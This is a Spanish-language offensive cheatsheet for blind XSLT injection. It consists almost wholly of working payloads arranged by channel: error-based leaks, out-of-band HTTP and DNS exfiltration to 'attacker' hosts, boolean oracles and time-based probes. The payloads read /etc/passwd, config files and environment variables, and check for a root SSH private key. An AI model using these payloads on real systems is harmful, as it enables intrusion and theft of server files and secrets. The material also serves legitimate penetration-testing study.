---
aliases:
  - XSLT Blind Injection
  - XSLT Error-based Exfil
  - XSLT OOB
tags:
  - type/cheatsheet
  - vuln/xslt-injection
  - technique/exfiltration
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - >-
    [[eXtensible Stylesheet Language Transformations (XSLT) Server-Side
    Injection]]
---
# XSLT - Blind Exfil

***

## Error-based

| **Objetivo** | **Payload** | **Canal** |
|:---:|:---:|:---:|
| Forzar parser fail | `<xsl:value-of select="document('file:///etc/passwd')/nonexistent/node"/>` | Error con root del XML cargado. |
| Type error div 0 | `<xsl:value-of select="document('file:///etc/passwd') div 0"/>` | Division forzada → error con contenido. |
| NaN cast | `<xsl:value-of select="number(unparsed-text('file:///etc/passwd'))"/>` | Cast número → error con string. |
| Saxon evaluate | `<xsl:value-of select="saxon:evaluate(unparsed-text('file:///etc/passwd'))" xmlns:saxon="http://saxon.sf.net/"/>` | Stack trace incluye string completo. |
| Bogus function | `<xsl:value-of select="bogusfn(unparsed-text('file:///etc/passwd'))"/>` | Mensaje del motor con argumento. |
| XPath syntax error | `<xsl:value-of select="*[unparsed-text('file:///etc/passwd')]"/>` | Predicate type fail. |
^xslt-blind-error

___

## OOB HTTP

| **Objetivo** | **Payload** | **Canal** |
|:---:|:---:|:---:|
| Listener simple | `python3 -m http.server 8080` (atacante) | Logs en consola. |
| Burp Collaborator | `interactsh-client -v` | Domain único + dashboard. |
| Exfil 2.0+ | `<xsl:copy-of select="document(concat('http://attacker:8080/?d=', encode-for-uri(unparsed-text('file:///etc/passwd'))))"/>` | URL del listener con data encoded. |
| Exfil 1.0 | `<xsl:copy-of select="document(concat('http://attacker:8080/?d=', document('file:///var/www/config.xml')))"/>` | XML válido + concat URL. |
| Chunked | `<xsl:for-each select="1 to 10"><xsl:copy-of select="document(concat('http://attacker/?n=',.,'&amp;d=',encode-for-uri(substring($s,(.-1)*200+1,200))))"/></xsl:for-each>` | Para data > 2000 bytes. |
| OOB con header | `<xsl:value-of select="unparsed-text(concat('http://attacker/?f=', encode-for-uri($secret)))"/>` | XSLT 2.0+ — alternativa. |
^xslt-blind-oob

___

## DNS exfil

| **Objetivo** | **Payload** | **Canal** |
|:---:|:---:|:---:|
| Setup nameserver | `sudo tcpdump -ni eth0 -s 0 -A 'udp port 53'` | Captura queries. |
| Burp Collaborator DNS | Subdomain `<id>.oast.fun` automático | Dashboard de queries. |
| Hostname exfil | `<xsl:value-of select="document(concat('http://', unparsed-text('file:///etc/hostname'), '.attacker.com/'))"/>` | Hostname en subdomain. |
| User exfil | `<xsl:value-of select="document(concat('http://', environment-variable('USER'), '.attacker.com/'))"/>` | Env var en subdomain (3.0). |
| Hex chunked | `<xsl:for-each select="1 to 10"><xsl:value-of select="document(concat('http://chunk',.,'-',$hex,'.attacker.com/'))"/></xsl:for-each>` | Hex encode + chunks ≤63 chars. |
| Boolean DNS | `<xsl:if test="contains(unparsed-text('file:///etc/passwd'),'r:x:0')"><xsl:value-of select="document('http://hit.attacker.com/')"/></xsl:if>` | DNS query solo si match. |
^xslt-blind-dns

___

## Boolean oracle

| **Objetivo** | **Payload** | **Canal** |
|:---:|:---:|:---:|
| Char match | `<xsl:if test="substring(unparsed-text('file:///etc/passwd'),1,1)='r'">MARKER</xsl:if>` | `MARKER` en response → match. |
| Contains check | `<xsl:if test="contains(unparsed-text('file:///etc/passwd'),'root:')">FOUND</xsl:if>` | Substring oracle. |
| Length check | `<xsl:if test="string-length(unparsed-text('file:///etc/passwd')) &gt; 1000">BIG</xsl:if>` | Tamaño aproximado. |
| Codepoint compare | `<xsl:if test="string-to-codepoints(substring($s,POS,1))[1] &lt; PIVOT">LT</xsl:if>` | Búsqueda binaria — log₂(64) requests. |
| Starts-with | `<xsl:if test="starts-with(unparsed-text('file:///etc/passwd'),'root')">STARTS</xsl:if>` | Validación inicial. |
| File exists | `<xsl:if test="unparsed-text-available('file:///root/.ssh/id_rsa')">EXISTS</xsl:if>` | Existencia sin contenido. |
^xslt-blind-bool

___

## Time-based

| **Objetivo** | **Payload** | **Canal** |
|:---:|:---:|:---:|
| Loop 2.0+ | `<xsl:for-each select="1 to 5000000"><xsl:value-of select="string-length(concat(.,.))"/></xsl:for-each>` | ~3-5s delay observable. |
| Choose conditional | `<xsl:choose><xsl:when test="substring($s,1,1)='r'"><xsl:for-each select="1 to 5000000">...</xsl:for-each></xsl:when></xsl:choose>` | Delay solo si match. |
| Recursión 1.0 | `<xsl:call-template name="loop"><xsl:with-param name="i" select="100000"/></xsl:call-template>` | Emular loop en XSLT 1.0. |
| Timing comparativo | `time curl ... <probe-no-loop>` vs `time curl ... <probe-with-loop>` | Diff ≥ 1.5s confiable. |
| Sleep via Saxon | `<xsl:value-of select="saxon:eval(saxon:expression('Thread.sleep(2000)'))"/>` | Saxon-PE/EE. |
| Timeout exceed | `<xsl:for-each select="1 to 999999999">...</xsl:for-each>` | Force timeout — diff entre éxito/fail. |
^xslt-blind-time

***
